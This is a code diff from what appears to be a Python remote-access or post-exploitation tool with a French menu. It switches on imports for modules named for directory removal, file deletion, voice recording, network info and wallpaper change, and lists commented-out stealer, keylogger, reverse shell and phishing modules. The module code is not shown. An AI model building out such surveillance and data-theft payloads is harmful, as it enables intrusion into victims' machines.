@@ -2,24 +2,22 @@ from colorama import Fore, Style
 import os 
 from Option.modules.payload.clipboard import clipboard_module
 from Option.modules.payload.screenshot import screenshot_module
-#from Option.modules.payload.dirlist import directory_listing_module
+from Option.modules.payload.dirlist import directory_listing_module
 #from Option.modules.payload.filegrab import file_grabber_module
 #from Option.modules.payload.keybcontrol import keyboard_controller_module
-#from Option.modules.payload.networkinfo import network_info_module
+from Option.modules.payload.networkinfo import network_info_module
 from Option.modules.payload.openurl import open_url_module
 #from Option.modules.payload.porthammer import port_hammer_module
 #from Option.modules.payload.processview import process_view_module
-#from Option.modules.payload.restart import restart_pc_module
 #from Option.modules.payload.reversehttp import reverse_http_module
 #from Option.modules.payload.reverseshell import reverse_shell_module
-#from Option.modules.payload.rmdir import remove_directory_module
-#from Option.modules.payload.rmscript import remove_file_module
+from Option.modules.payload.rmdir import remove_directory_module
+from Option.modules.payload.rmscript import remove_file_module
 from Option.modules.payload.runcmd import runcmd_module
 from Option.modules.payload.shutdown import shutdown_module
 #from Option.modules.payload.steal import stealer_module
-#from Option.modules.payload.voicerec import voice_record_module
-#from Option.modules.payload.wallpaper import change_wallpaper_module
-#from Option.modules.payload.wifissid import wifi_ssid_module
+from Option.modules.payload.voicerec import voice_record_module
+from Option.modules.payload.wallpaper import change_wallpaper_module
 #from Option.modules.capture.phishing import phishing_module
 #from Option.modules.capture.keylogger import keylogger_module
 #from Option.modules.scanner.vulnerabilityscanner import vulnerability_scanner_module
@@ -207,3 +205,4 @@ Appuyez sur Entrée pour continuer...
             break
         else:
             print(Fore.RED + "Commande inconnue. Veuillez entrer 'payload', 'capture', 'scan' ou 'exit'." + Style.RESET_ALL)
+
